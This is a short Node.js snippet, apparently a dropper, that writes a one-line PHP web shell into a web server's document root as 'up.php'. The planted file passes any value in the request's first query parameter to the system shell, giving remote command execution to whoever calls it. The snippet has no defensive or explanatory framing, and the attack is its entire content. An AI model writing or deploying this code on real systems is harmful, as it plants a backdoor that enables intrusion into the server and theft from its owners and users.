const fs = require('fs');
const shell = Buffer.from('<?php system($_GET[0]); ?>');
fs.writeFileSync('/var/www/html/up.php', shell);
